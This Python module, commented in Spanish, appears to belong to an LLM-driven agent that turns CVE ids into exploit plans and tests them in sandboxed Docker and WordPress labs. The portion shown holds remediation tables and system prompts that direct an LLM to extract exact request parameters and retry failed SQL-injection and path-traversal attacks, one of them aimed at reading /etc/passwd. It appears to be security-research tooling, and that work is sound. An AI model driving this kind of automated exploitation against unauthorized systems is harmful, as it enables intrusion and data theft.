"""Agente de investigacion de exploits guiado por LLM (de la CVE al exploit, iterando).

Este es el "LLM investigando y probando" del problema abierto: dado un id CVE, el agente:
  1. Consulta la CVE (NVD + PoCs de GitHub/Exploit-DB) y decide si es un hueco.
  2. RAZONA con el LLM: clase de vuln, primitiva, que binario haria falta, como se dispara, y una
     estrategia de explotacion. Es HIPOTESIS (grounded como razonamiento, no como hecho probado).
  3. Deriva el esquema y DESARROLLA la plantilla de exploit para la clase.
  4. Si hay un binario, PRUEBA de verdad: corre la auto-explotacion autonoma (offset+cadena+sandbox)
     y el LLM revisa el resultado. Lo VERIFICADO sale del sandbox, no del modelo.
  5. Informe honesto: que se sabe, que hipotetizo el LLM, que se VERIFICO y que queda bloqueado
     (p.ej. hace falta el binario vulnerable concreto o el disparador de red).

Sin LLM disponible, degrada a la via determinista (lookup + desarrollo + auto-explotacion). El agente
nunca afirma un exploit funcional que el sandbox no haya confirmado. Solo objetivos autorizados.
"""
from __future__ import annotations

import json
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import asdict, dataclass, field, fields
from typing import Any, Callable, List, Optional

_B64_PNG_PREFIX = "data:image/png;base64,"

# impacto tipico por clase de vulnerabilidad -- una frase clara y concreta de que gana un
# atacante, no una etiqueta vaga. Usado para dejar el impacto marcado y visible en el informe,
# no enterrado dentro de la descripcion en prosa de la CVE.
_IMPACT_BY_CLASS = {
    "missing-authorization": ("CRITICO", "Un usuario autenticado de BAJO privilegio puede tomar "
                              "el control de CUALQUIER otra cuenta (incluida la de administrador): "
                              "cambiar su email/password sin que el sistema compruebe que tiene "
                              "permiso sobre ese recurso concreto.", "CRITICAL", "A LOW-privilege "
                              "authenticated user can take over ANY other account (including "
                              "admin): change its email/password without the system checking "
                              "they have permission over that specific resource."),
    "idor": ("ALTO", "Un usuario autenticado puede leer o modificar recursos de OTROS usuarios "
            "(pedidos, documentos, datos personales) cambiando un identificador en la peticion.",
            "HIGH", "An authenticated user can read or modify OTHER users' resources (orders, "
            "documents, personal data) by changing an identifier in the request."),
    "auth-bypass": ("CRITICO", "Un atacante puede saltarse la autenticacion por completo y "
                    "acceder como si estuviera logueado, sin credenciales validas.", "CRITICAL",
                    "An attacker can bypass authentication entirely and access the system as if "
                    "logged in, with no valid credentials."),
    "sqli": ("CRITICO", "Lectura/modificacion arbitraria de la base de datos completa (usuarios, "
            "credenciales, contenido); en motores con privilegios amplios, puede escalar a "
            "ejecucion de comandos en el servidor.", "CRITICAL", "Arbitrary read/write of the "
            "entire database (users, credentials, content); on engines with broad privileges, "
            "can escalate to command execution on the server."),
    "rce": ("CRITICO", "Ejecucion remota de codigo arbitrario: control total del servidor que "
           "aloja el sitio.", "CRITICAL", "Arbitrary remote code execution: full control of the "
           "server hosting the site."),
    "command-injection": ("CRITICO", "Ejecucion de comandos del sistema operativo con los "
                          "privilegios del proceso web: control total del servidor.", "CRITICAL",
                          "Operating-system command execution with the web process's privileges: "
                          "full control of the server."),
    "file-upload": ("CRITICO", "Subida de un fichero malicioso (p.ej. un webshell) que, al "
                    "ejecutarse, da control remoto del servidor.", "CRITICAL", "Upload of a "
                    "malicious file (e.g. a webshell) that, once executed, gives remote control "
                    "of the server."),
    "deserialization": ("CRITICO", "Deserializar datos controlados por el atacante puede derivar "
                        "en ejecucion remota de codigo, segun los objetos disponibles en la "
                        "aplicacion.", "CRITICAL", "Deserializing attacker-controlled data can "
                        "lead to remote code execution, depending on the objects available in "
                        "the application."),
    "xxe": ("ALTO", "Lectura de ficheros arbitrarios del servidor y, en configuraciones "
           "vulnerables, peticiones de red desde el propio servidor (SSRF via XXE).", "HIGH",
           "Arbitrary server file read, and in vulnerable configurations, network requests "
           "originating from the server itself (SSRF via XXE)."),
    "ssrf": ("ALTO", "El servidor hace peticiones a donde el atacante decide: acceso a servicios "
            "internos no expuestos (metadatos de nube, APIs internas, red privada).", "HIGH",
            "The server makes requests wherever the attacker decides: access to internal, "
            "unexposed services (cloud metadata, internal APIs, private network)."),
    "ssti": ("CRITICO", "Inyeccion en el motor de plantillas del lado servidor: habitualmente "
            "deriva en ejecucion remota de codigo.", "CRITICAL", "Server-side template engine "
            "injection: typically leads to remote code execution."),
    "path-traversal": ("ALTO", "Lectura (y a veces escritura) de ficheros arbitrarios fuera del "
                       "directorio previsto, incluyendo configuracion con credenciales.", "HIGH",
                       "Read (and sometimes write) of arbitrary files outside the intended "
                       "directory, including configuration files with credentials."),
    "xss": ("MEDIO", "Ejecucion de JavaScript arbitrario en el navegador de otros usuarios: robo "
           "de sesion, phishing dentro del propio sitio, acciones en su nombre.", "MEDIUM",
           "Arbitrary JavaScript execution in other users' browsers: session theft, phishing "
           "within the site itself, acting on their behalf."),
    "csrf": ("MEDIO", "Un sitio malicioso puede hacer que el navegador de la victima, ya logueada, "
            "ejecute una accion no deseada sin que se de cuenta.", "MEDIUM", "A malicious site "
            "can make the victim's already-logged-in browser perform an unwanted action without "
            "them noticing."),
    "open-redirect": ("BAJO", "Util como pieza de apoyo en campanas de phishing (una URL del "
                      "dominio legitimo que redirige a un sitio controlado por el atacante).",
                      "LOW", "Useful as a supporting piece in phishing campaigns (a URL on the "
                      "legitimate domain that redirects to an attacker-controlled site)."),
}

# recomendaciones de mitigacion por clase -- concretas y accionables, no un generico "aplica
# buenas practicas". Cada entrada es (es, en); el bullet de "actualiza a una version parcheada"
# se antepone SIEMPRE por separado (ver render_investigation) porque aplica a toda vulnerabilidad
# de un componente de terceros, independientemente de la clase.
_REMEDIATION_BY_CLASS = {
    "missing-authorization": (
        "Anadir una comprobacion explicita de capacidad/propiedad (p.ej. `current_user_can()` en "
        "WordPress) ANTES de modificar cualquier recurso, verificando que el usuario autenticado "
        "es el propietario del recurso o tiene el rol requerido -- nunca confiar en que el ID del "
        "recurso venga del cliente sin validar la relacion usuario-recurso en servidor.",
        "Add an explicit capability/ownership check (e.g. `current_user_can()` in WordPress) "
        "BEFORE modifying any resource, verifying the authenticated user owns the resource or "
        "has the required role -- never trust a client-supplied resource ID without validating "
        "the user-resource relationship server-side."),
    "idor": (
        "Validar en servidor que el recurso solicitado pertenece al usuario autenticado "
        "(comprobacion de propiedad por consulta, no solo de autenticacion) antes de devolver o "
        "modificar cualquier dato referenciado por ID.",
        "Validate server-side that the requested resource belongs to the authenticated user "
        "(an ownership check per query, not just an authentication check) before returning or "
        "modifying any ID-referenced data."),
    "auth-bypass": (
        "Revisar la logica de autenticacion/sesion en busca de rutas que omitan la comprobacion "
        "(cabeceras confiadas sin validar, comparaciones de tipo inseguras, condiciones de "
        "carrera); anadir pruebas de regresion que cubran especificamente el bypass encontrado.",
        "Review the authentication/session logic for paths that skip the check (trusted headers "
        "without validation, unsafe type comparisons, race conditions); add regression tests "
        "that specifically cover the bypass found."),
    "sqli": (
        "Sustituir la concatenacion de SQL por consultas PARAMETRIZADAS/prepared statements "
        "(p.ej. `$wpdb->prepare()` en WordPress) en el sumidero afectado; aplicar el principio "
        "de minimo privilegio a la cuenta de base de datos de la aplicacion; un WAF puede mitigar "
        "en caliente mientras se despliega el parche, pero NO sustituye el fix en el codigo.",
        "Replace SQL string concatenation with PARAMETERIZED queries/prepared statements (e.g. "
        "`$wpdb->prepare()` in WordPress) at the affected sink; apply least privilege to the "
        "application's database account; a WAF can mitigate in the short term while the patch "
        "is deployed, but does NOT replace the code fix."),
    "rce": (
        "Eliminar o aislar la ruta de ejecucion de codigo controlada por el atacante (deshabilitar "
        "funciones peligrosas si no son imprescindibles, sandboxing/contenedores con privilegios "
        "minimos); auditar el resto de la base de codigo por el mismo patron de entrada no "
        "confiable llegando a ejecucion.",
        "Remove or isolate the attacker-controlled code execution path (disable dangerous "
        "functions if not essential, sandboxing/least-privilege containers); audit the rest of "
        "the codebase for the same pattern of untrusted input reaching execution."),
    "command-injection": (
        "Evitar invocar el shell con entrada del usuario; si es imprescindible, usar APIs que "
        "pasen argumentos como lista (sin interpretacion de shell, p.ej. `subprocess` con "
        "`shell=False`) y una lista blanca estricta de valores permitidos.",
        "Avoid invoking the shell with user input; if unavoidable, use APIs that pass arguments "
        "as a list (no shell interpretation, e.g. `subprocess` with `shell=False`) and a strict "
        "allow-list of permitted values."),
    "file-upload": (
        "Validar el tipo real del fichero por contenido (no por extension/Content-Type, que el "
        "atacante controla), almacenar fuera del webroot o con ejecucion de scripts deshabilitada "
        "en ese directorio, y renombrar con un nombre generado por el servidor.",
        "Validate the file's real type by content (not by extension/Content-Type, which the "
        "attacker controls), store outside the webroot or with script execution disabled in "
        "that directory, and rename with a server-generated name."),
    "deserialization": (
        "Evitar deserializar datos no confiables; si es imprescindible, usar un formato sin "
        "ejecucion de codigo (JSON) o una lista blanca estricta de clases permitidas en la "
        "deserializacion.",
        "Avoid deserializing untrusted data; if unavoidable, use a format with no code execution "
        "(JSON) or a strict allow-list of classes permitted during deserialization."),
    "xxe": (
        "Deshabilitar la resolucion de entidades externas y DTDs en el parser XML "
        "(`libxml_disable_entity_loader`/equivalente del lenguaje); nunca confiar en la "
        "configuracion por defecto del parser.",
        "Disable external entity and DTD resolution in the XML parser "
        "(`libxml_disable_entity_loader`/language equivalent); never rely on the parser's "
        "default configuration."),
    "ssrf": (
        "Validar el destino de cualquier peticion saliente iniciada por el servidor contra una "
        "lista blanca de hosts/IPs permitidos, bloqueando explicitamente rangos internos/de "
        "metadatos de nube (169.254.169.254, RFC1918).",
        "Validate the destination of any server-initiated outbound request against an allow-list "
        "of permitted hosts/IPs, explicitly blocking internal/cloud-metadata ranges "
        "(169.254.169.254, RFC1918)."),
    "ssti": (
        "Nunca pasar entrada del usuario directamente como plantilla; usar el motor en modo "
        "'logic-less' o con sandboxing estricto, y tratar la entrada del usuario solo como "
        "VALOR de variable, nunca como la plantilla en si.",
        "Never pass user input directly as a template; use the engine in 'logic-less' mode or "
        "with strict sandboxing, and treat user input only as a variable VALUE, never as the "
        "template itself."),
    "path-traversal": (
        "Resolver la ruta final y verificar que sigue dentro del directorio base permitido "
        "(comparacion de ruta canonica, no solo filtrar '../'); usar un identificador indirecto "
        "(ID de base de datos) en vez del nombre de fichero real cuando sea posible.",
        "Resolve the final path and verify it stays within the allowed base directory (canonical "
        "path comparison, not just filtering '../'); use an indirect identifier (database ID) "
        "instead of the real filename where possible."),
    "xss": (
        "Escapar la salida segun el contexto (HTML/atributo/JS) en el punto donde se imprime, "
        "nunca solo al guardar; usar las funciones de escape del framework "
        "(`esc_html()`/`esc_attr()` en WordPress) y una Content-Security-Policy restrictiva.",
        "Escape output according to context (HTML/attribute/JS) at the point it is printed, "
        "never only on save; use the framework's escaping functions "
        "(`esc_html()`/`esc_attr()` in WordPress) and a restrictive Content-Security-Policy."),
    "csrf": (
        "Verificar un token CSRF por sesion/accion (`wp_verify_nonce()` en WordPress) en toda "
        "accion que cambie estado, y comprobar tambien la cabecera Origin/Referer como defensa "
        "adicional.",
        "Verify a per-session/per-action CSRF token (`wp_verify_nonce()` in WordPress) on every "
        "state-changing action, and also check the Origin/Referer header as an additional "
        "defense."),
    "open-redirect": (
        "Validar el destino de cualquier redireccion contra una lista blanca de rutas/dominios "
        "permitidos; si se necesita una URL externa, mostrar una pagina intermedia de aviso en "
        "vez de redirigir automaticamente.",
        "Validate the destination of any redirect against an allow-list of permitted paths/"
        "domains; if an external URL is needed, show an intermediate warning page instead of "
        "redirecting automatically."),
}


@dataclass
class Investigation:
    cve_id: str
    description: str = ""
    lookup_ok: bool = False
    lookup_note: str = ""     # por que lookup_ok es False: formato invalido, red/rate-limit...
    is_gap: bool = False
    cvss_score: Optional[float] = None    # de NVD (fetch_cve) -- None si no consta/sin red
    cvss_severity: str = ""
    cvss_vector: str = ""
    published: str = ""        # fecha de publicacion en NVD (ISO), "" si no consta
    vuln_class: str = ""
    llm_notes: dict = field(default_factory=dict)     # hipotesis del modelo (target, trigger, plan)
    developed_script: str = ""
    poc_kind: str = "pwntools"                        # "pwntools" (memoria) | "http" | "html" (web)
    verified: bool = False
    verified_detail: str = ""
    verified_evidence: dict = field(default_factory=dict)   # datos REALES de la ejecucion verificada
                                                              # (payload enviado, admin_id, status
                                                              # code, password/email reales que
                                                              # funcionaron) -- de un laboratorio
                                                              # desechable, nunca de un objetivo real
    trigger: str = ""                                 # disparador descubierto por auto-fuzzing
    blockers: List[str] = field(default_factory=list)
    steps: List[str] = field(default_factory=list)
    source_fetch: dict = field(default_factory=dict)  # {ok, kind, resolved_version, local_path}
    source_grounding: dict = field(default_factory=dict)  # {found: {fn: [loc,...]}, not_found: [...]}
    dynamic_verify: dict = field(default_factory=dict)    # {attempted, available, verified, detail}
    poc_source_used: str = ""   # URL del PoC publico (GitHub) realmente leido, "" si ninguno
    attempt_evidence: dict = field(default_factory=dict)  # evidencia REAL del intento (screenshots
                                                             # incluidas) incluso cuando NO se
                                                             # confirma -- bug real encontrado en
                                                             # vivo, CVE-2024-1071: el laboratorio
                                                             # capturaba varias capturas (WP
                                                             # instalado, plugin activo, subscriber
                                                             # creado) ANTES de bloquearse en el
                                                             # login, pero se perdian porque solo
                                                             # inv.verified_evidence (que exige
                                                             # inv.verified=True) llegaba al
                                                             # informe


# Historial local de resultados por CVE -- confirmado en vivo esta misma sesion: reinvestigar la
# MISMA CVE una y otra vez tras cada fix (o, con investigate-batch, relanzar el lote entero por
# una sola CVE que fallo) repite desde cero pasos que no cambian (consultar la CVE, leer el PoC
# publico, descargar el codigo...), aunque el RESULTADO siga siendo el mismo. BINORACLE_CACHE_DIR
# reubica el directorio (comparte el mismo que la cache de plugins/modulos de websource.py);
# BINORACLE_NO_CACHE=1 la desactiva.
_INVESTIGATION_CACHE_DIR = os.environ.get("BINORACLE_CACHE_DIR") or os.path.join(
    os.path.expanduser("~"), ".cache", "binoracle")
_INVESTIGATION_CACHE_DISABLED = os.environ.get("BINORACLE_NO_CACHE", "") not in ("", "0")


def _investigation_cache_path(cve_id: str) -> str:
    safe_id = re.sub(r"[^A-Za-z0-9-]", "_", (cve_id or "").upper().strip())
    return os.path.join(_INVESTIGATION_CACHE_DIR, "investigations", f"{safe_id}.json")


def save_investigation_to_cache(inv: "Investigation") -> None:
    """Guarda el resultado de una investigacion YA TERMINADA para no repetirla desde cero la
    proxima vez que se pida la misma CVE. Best-effort a proposito: un fallo guardando (permisos,
    disco lleno...) nunca debe tirar abajo una investigacion que SI termino bien -- solo significa
    que la proxima vez no habra cache, no es un error real. Escritura atomica (temporal + rename)
    para que dos investigaciones de la MISMA CVE en un lote en paralelo no se pisen a medias."""
    if _INVESTIGATION_CACHE_DISABLED:
        return
    try:
        path = _investigation_cache_path(inv.cve_id)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        tmp = path + f".tmp-{os.getpid()}"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(asdict(inv), f)
        os.replace(tmp, path)
    except Exception:
        pass


def load_investigation_from_cache(cve_id: str) -> Optional["Investigation"]:
    """Devuelve la investigacion YA GUARDADA para esta CVE, o None si no hay cache (desactivada,
    nunca se guardo, o el fichero esta corrupto/de un esquema distinto). Sin caducidad por
    tiempo -- la CVE en si no cambia, pero el CODIGO de binoracle si (confirmado en vivo multiples
    veces esta sesion: el mismo CVE daba resultados distintos tras cada fix) -- por eso
    investigate_cve() siempre deja forzar una investigacion fresca (use_cache=False / --no-cache)
    en vez de asumir que la cache sigue siendo valida para siempre."""
    if _INVESTIGATION_CACHE_DISABLED:
        return None
    path = _investigation_cache_path(cve_id)
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        valid_fields = {fl.name for fl in fields(Investigation)}
        data = {k: v for k, v in data.items() if k in valid_fields}
        return Investigation(**data)
    except Exception:
        return None


_RESEARCH_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Analizas "
    "una vulnerabilidad y propones un plan tecnico. Responde SOLO con JSON valido con las claves: "
    "vuln_class (memoria: stack-overflow, heap-overflow, uaf, double-free, format-string, oob-write, "
    "oob-read, integer-overflow, type-confusion; WEB/APP: missing-authorization, idor, auth-bypass, "
    "sqli, xss, ssrf, command-injection, rce, path-traversal, file-upload, deserialization, xxe, "
    "ssti, csrf, open-redirect; u otra), primitive (que concede), target_binary (binario/componente "
    "a obtener; para paquetes pip/npm/gem/maven/php pon el nombre EXACTO del paquete tal como "
    "aparece en la descripcion: p.ej. 'log4j-core', 'spring-webmvc', 'jackson-databind', "
    "'phpmailer', 'guzzle'; para plugins WordPress deja el slug; para binarios nativos pon "
    "el nombre del binario), source_url (si lo sabes: repo git o zip del codigo vulnerable; "
    "para plugins WordPress deja el slug), affected_version (version afectada, p.ej. '5.1.8'; "
    "si la descripcion dice 'Version X.Y.Z fixes this issue', la version VULNERABLE es X.Y.Z-1 "
    "-- NO pongas la version parcheada), "
    "vulnerable_functions (lista de funciones/metodos citados, p.ej. update_user), trigger (como se "
    "alcanza: stdin/argumento/fichero/peticion HTTP...), http_method (GET/POST si es web), endpoint "
    "(ruta/accion si es web; si es un endpoint AJAX de WordPress (wp-admin/admin-ajax.php), el "
    "endpoint DEBE incluir el valor REAL de 'action' como query string, "
    "p.ej. /wp-admin/admin-ajax.php?action=pc_added_uploaded_image -- NUNCA dejes 'action' como "
    "un nombre de parametro suelto en 'parameters' sin su valor: sin el valor REAL de accion, "
    "WordPress no enruta la peticion a ningun manejador y la vulnerabilidad nunca se alcanza, "
    "sea cual sea el resto del payload), parameters (lista de parametros relevantes DISTINTOS de "
    "'action', que ya va en el endpoint), auth_required (true/false/rol minimo), strategy (una "
    "frase), steps (lista de pasos concretos). Se tecnico y breve; deja vacio lo que no sepas."
)


def _llm_research(llm, cve_id: str, description: str) -> Optional[dict]:
    """Pide al LLM un analisis estructurado de la CVE. Devuelve el dict o None si no hay modelo."""
    if llm is None or not getattr(llm, "available", lambda: False)():
        return None
    from ..llm.base import Message
    prompt = (f"CVE: {cve_id}\nDescripcion: {description}\n\n"
              "Analiza la vulnerabilidad y da el plan en JSON con las claves indicadas.")
    try:
        raw = llm.chat([Message("system", _RESEARCH_SYS), Message("user", prompt)], json_mode=True)
        data = json.loads(raw)
        if isinstance(data, dict):
            return data
    except Exception:
        return None
    return None


_REFINE_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Te doy "
    "un fragmento de codigo PHP REAL de un plugin de WordPress, alrededor de una funcion vulnerable "
    "ya confirmada. Tu trabajo es leerlo y extraer los datos EXACTOS para construir la peticion HTTP "
    "real -- no adivines desde la descripcion de la CVE, lee el codigo. Responde SOLO con JSON valido "
    "con las claves: ajax_action (el string EXACTO registrado en add_action('wp_ajax_...', ...) o "
    "'wp_ajax_nopriv_...' que dispara esta funcion; vacio si no es un handler AJAX), http_method "
    "(GET o POST, segun que superglobal lee: $_POST->POST, $_GET->GET, $_REQUEST->POST por defecto), "
    "parameters (lista de los nombres EXACTOS de parametro que el codigo lee, tal cual aparecen en "
    "$_POST['x']/$_GET['x']/$_REQUEST['x'] o en llamadas a sanitizadores como "
    "Helper::sanitize('x','post',...) -- incluye el nombre LITERAL, con guiones/mayusculas si los "
    "tiene, nunca lo traduzcas), id_param (cual de esos parametros es el ID del usuario/recurso "
    "objetivo, vacio si ninguno), email_param (cual es el nuevo email, vacio si ninguno), pass_param "
    "(cual es la nueva password, vacio si ninguno O si el codigo exige la password ACTUAL antes de "
    "aceptar una password nueva -- en ese caso no sirve para un ataque sin credenciales, dejalo vacio "
    "y el ataque se centra solo en el email), setup_options (lista de objetos {\"name\":..., "
    "\"value\":...} -- SOLO si el fragmento muestra el codigo vulnerable DENTRO de un condicional "
    "que depende de una opcion de WordPress/del plugin, p.ej. "
    "'if ( get_option(\"X\") ) { ...codigo vulnerable... }' o "
    "'if ( UM()->options()->get(\"X\") ) { ... }' -- en ese caso el ataque NO llega a ese codigo "
    "con la configuracion de fabrica del plugin, y hay que activar esa opcion ANTES de probarlo; "
    "'name' es el string EXACTO del nombre de la opcion tal cual aparece en el codigo, 'value' el "
    "valor que activa esa rama (normalmente '1' para un booleano, pero usa lo que el codigo "
    "compare de verdad si lo ves, p.ej. comparar contra 'yes' en vez de 1). Lista vacia si no ves "
    "ningun condicional de este tipo -- no inventes una opcion que no este literalmente en el "
    "codigo que te doy). Se exacto: un nombre de parametro mal copiado hace que la peticion real "
    "falle."
)


# tope del bucle de aprendizaje-y-reintento (1 intento inicial + como mucho esto-1 reintentos
# sugeridos por el LLM) -- acotado a proposito: cada intento levanta un laboratorio Docker real
# entero (varios minutos), y un bucle sin limite podria no terminar nunca si el LLM sigue viendo
# "una pista mas" indefinidamente sin confirmar nada de verdad. Compartido por CUALQUIER
# verificador que use el bucle de reintento (no solo SQLi, el nombre se queda por compatibilidad
# con el primero que lo uso).
_SQLI_RETRY_MAX_ATTEMPTS = 3
_RETRY_MAX_ATTEMPTS = _SQLI_RETRY_MAX_ATTEMPTS

_SQLI_RETRY_EVIDENCE_KEYS = {"endpoint_probado": "endpoint", "parametro_probado": "sqli_param",
                            "respuesta_control_recorte": "respuesta_control_recorte",
                            "diagnostico_scraping_nonce": "nonce_scraping_diagnostico"}

# bloqueos de INFRAESTRUCTURA (no de la tecnica en si) que puede encontrar CUALQUIER verificador
# dinamico de WordPress, no solo SQLi -- un nonce/token sin resolver, o un plugin que no muestra
# NADA de si mismo porque exige un paso de configuracion propio (ver _auto_resolve_wp_blockers y
# _PLUGIN_SETUP_TRIGGER_PATHS en wpverify.py). Factorizado en un unico texto compartido para que
# cada _X_RETRY_SYS especifico de una tecnica (SQLi, path-traversal, command-injection...) lo
# incluya sin repetir el mismo parrafo largo -- confirmado en vivo, Ultimate Member/CVE-2024-1071.
_WP_NONCE_SETUP_RETRY_HINT = (
    "CASO APARTE -- nonce/token invalido: si la respuesta dice literalmente algo como 'Wrong "
    "Nonce'/'Invalid nonce'/'Invalid security token' (binoracle YA intenta sacar el nonce real "
    "raspando TODAS las paginas publicadas del sitio antes de atacar, asi que si esto sigue "
    "pasando es que ese nonce concreto esta en una pagina que esa busqueda no cubrio), y conoces "
    "(por el nombre/README del PoC publico, o por convenciones tipicas de ese plugin -- NUNCA "
    "inventada sin base) una pagina CONCRETA del sitio donde ese nonce se expondria normalmente "
    "(p.ej. una pagina de registro/login/cuenta que el plugin crea para si mismo), indicalo en "
    "'pagina_extra_para_nonce' como una ruta relativa (p.ej. '/register/') para que se pruebe "
    "tambien -- deja este campo vacio si no tienes ninguna pista concreta. "
    "OTRO CASO APARTE -- el plugin no muestra NADA de si mismo: si 'diagnostico_scraping_nonce' "
    "dice que se probaron varias paginas reales del sitio y NINGUNA tenia rastro del plugin "
    "atacado, es una pista fuerte de que ese plugin no crea su contenido por defecto (paginas, "
    "shortcodes...) con la simple activacion -- muchos plugins (confirmado en vivo, Ultimate "
    "Member/CVE-2024-1071, que exige visitar una URL propia de 'instalar paginas por defecto') "
    "exigen un paso de configuracion aparte. Si conoces (por convenciones tipicas de WordPress, "
    "o porque el nombre del plugin/la documentacion que conoces lo menciona -- NUNCA inventada) "
    "una URL de administrador que dispare ese paso (activar una opcion, pulsar un boton de "
    "'instalar paginas', correr un wizard de configuracion...), indicala en "
    "'pagina_setup_admin_requerida' como una ruta relativa que se visitara CON SESION DE ADMIN "
    "antes del siguiente intento -- deja vacio si no tienes ninguna pista concreta. "
    "TERCER CASO APARTE -- falta un parametro ADICIONAL real, distinto del que se esta probando "
    "como inyectable: si la respuesta rechaza la peticion por un motivo que NO tiene que ver con "
    "el parametro/payload inyectado (p.ej. 'Wrong member directory data', 'Invalid form id', "
    "'Missing X') -- confirmado en vivo, Ultimate Member/CVE-2024-1071: el endpoint exige un "
    "'directory_id' real ANTES de llegar siquiera al codigo vulnerable, y el parametro inyectable "
    "('sorting') es otro distinto -- indica el nombre REAL de ese campo que falta (del PoC "
    "publico, del propio mensaje de error, o de convenciones tipicas de ese plugin -- NUNCA "
    "inventado) en 'parametro_adicional_requerido'. SE AÑADE a la peticion (binoracle intenta "
    "resolver su valor real por su cuenta -- p.ej. fuerza bruta de IDs ofuscados -- si el nombre "
    "pinta a un identificador de recurso), NUNCA sustituye al parametro que se esta inyectando. "
    "Deja vacio si no tienes ninguna pista concreta. "
)
_WP_NONCE_SETUP_RETRY_JSON_FIELDS = (
    "\"pagina_extra_para_nonce\": \"...\" (opcional), \"pagina_setup_admin_requerida\": \"...\" "
    "(opcional), \"parametro_adicional_requerido\": \"...\" (opcional)"
)

_SQLI_RETRY_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Una "
    "inyeccion SQL contra un laboratorio WordPress REAL (plugin instalado, MySQL real) no se "
    "confirmo (ni error-based, ni UNION, ni boolean-blind, ni time-based). Te doy la evidencia REAL "
    "observada: el endpoint/parametro probados, y un recorte del cuerpo REAL de la respuesta de "
    "control (sin inyeccion). Lee esa evidencia como lo haria un analista humano revisando un "
    "negativo: si el cuerpo de la respuesta muestra una pista CONCRETA de que el endpoint o el "
    "parametro probados no son los correctos (p.ej. 'Page not found', un error PHP especifico, "
    "contenido que no tiene nada que ver con el plugin, una redireccion a login...), sugiere UN "
    "cambio concreto de endpoint y/o parametro que valga la pena reintentar. Si la evidencia NO "
    "da ninguna pista util (la respuesta parece normal/esperada y aun asi no se confirma), dilo "
    "honestamente -- no inventes un cambio sin base en la evidencia real que te doy. "
    + _WP_NONCE_SETUP_RETRY_HINT +
    "Responde SOLO con JSON: {\"tiene_sugerencia\": true/false, \"razon\": \"una frase, citando la "
    "pista concreta de la evidencia\", \"endpoint_alternativo\": \"...\" (opcional, solo si "
    "tiene_sugerencia), \"parametro_alternativo\": \"...\" (opcional), "
    + _WP_NONCE_SETUP_RETRY_JSON_FIELDS + "}"
)


_PATH_TRAVERSAL_RETRY_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Un "
    "path-traversal/LFI contra un laboratorio WordPress REAL (plugin instalado, fichero canario "
    "con secreto aleatorio plantado fuera del volumen web) no se confirmo -- ni el canario propio "
    "ni /etc/passwd literal aparecieron en ninguna de las ~90 variantes de ruta/codificacion "
    "probadas. Te doy la evidencia REAL observada: el endpoint/parametro probados, y un recorte "
    "del cuerpo REAL de la respuesta del primer intento (la ruta absoluta sin ninguna "
    "codificacion especial, la mas simple de todas). Lee esa evidencia como lo haria un analista "
    "humano revisando un negativo: si el cuerpo muestra una pista CONCRETA de que el endpoint o "
    "el parametro probados no son los correctos (p.ej. un error de la propia app como 'File is "
    "not moved', 'Page not found', una redireccion a login, contenido que no tiene nada que ver "
    "con el plugin...), sugiere UN cambio concreto de endpoint y/o parametro que valga la pena "
    "reintentar. Si la evidencia NO da ninguna pista util, dilo honestamente -- no inventes un "
    "cambio sin base real. "
    + _WP_NONCE_SETUP_RETRY_HINT +
    "Responde SOLO con JSON: {\"tiene_sugerencia\": true/false, \"razon\": "
    "\"una frase, citando la pista concreta de la evidencia\", \"endpoint_alternativo\": \"...\" "
    "(opcional, solo si tiene_sugerencia), \"parametro_alternativo\": \"...\" (opcional), "
    + _WP_NONCE_SETUP_RETRY_JSON_FIELDS + "}"
)
_PATH_TRAVERSAL_RETRY_EVIDENCE_KEYS = {"endpoint_probado": "endpoint",
                                       "parametro_probado": "path_param",
                                       "respuesta_cuerpo_recorte": "respuesta_muestra_primer_intento",
                                       "diagnostico_scraping_nonce": "nonce_scraping_diagnostico"}

# version GENERICA (no WordPress) del mismo mecanismo -- pedido explicitamente: no quedarse solo
# en WordPress, el objetivo aqui puede ser CUALQUIER tecnologia (Node/Python/PHP/Go/Java...) que
# el propio CVE/PoC traiga empaquetada en su Dockerfile/docker-compose (ver genericverify.py).
_GENERIC_PATH_TRAVERSAL_RETRY_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Un "
    "path-traversal contra un contenedor Docker REAL (construido desde el propio Dockerfile/"
    "docker-compose del codigo descargado -- puede ser cualquier tecnologia: Node, Python, PHP, "
    "Go, Java...) no se confirmo: se planto un fichero canario con un secreto aleatorio DENTRO "
    "del contenedor y ninguna de las variantes de ruta/codificacion probadas lo filtro. Te doy "
    "la evidencia REAL observada: el endpoint/parametro probados, y un recorte del cuerpo REAL "
    "de la respuesta del primer intento. Lee esa evidencia como lo haria un analista humano "
    "revisando un negativo: si el cuerpo muestra una pista CONCRETA de que el endpoint o el "
    "parametro probados no son los correctos (un error de la app, un 404, una ruta de API "
    "distinta, contenido que no tiene nada que ver con el endpoint esperado...), sugiere UN "
    "cambio concreto de endpoint y/o parametro que valga la pena reintentar. Si la evidencia NO "
    "da ninguna pista util, dilo honestamente -- no inventes un cambio sin base real. Responde "
    "SOLO con JSON: {\"tiene_sugerencia\": true/false, \"razon\": \"una frase, citando la pista "
    "concreta de la evidencia\", \"endpoint_alternativo\": \"...\" (opcional, solo si "
    "tiene_sugerencia), \"parametro_alternativo\": \"...\" (opcional)}"
)
_GENERIC_PATH_TRAVERSAL_RETRY_EVIDENCE_KEYS = {
    "endpoint_probado": "endpoint", "parametro_probado": "path_param",
    "respuesta_cuerpo_recorte": "respuesta_muestra_primer_intento"}

# mapeo de evidencia compartido por cualquier verify_* que ya capture un recorte REAL del cuerpo
# de la respuesta bajo la clave "respuesta_cuerpo_recorte" (command injection, SSTI, XXE, file
# upload... -- ver wpverify.py/genericverify.py) pero que todavia no tiene su propio prompt a
# medida -- se usa junto con _GENERIC_RETRY_SYS.
_RESPUESTA_CUERPO_EVIDENCE_KEYS = {"respuesta_cuerpo_recorte": "respuesta_cuerpo_recorte"}

# igual que arriba, pero para los verificadores de Drupal a los que se le anadio captura del
# PRIMER intento (no del ganador, que no existe en un negativo) bajo la clave
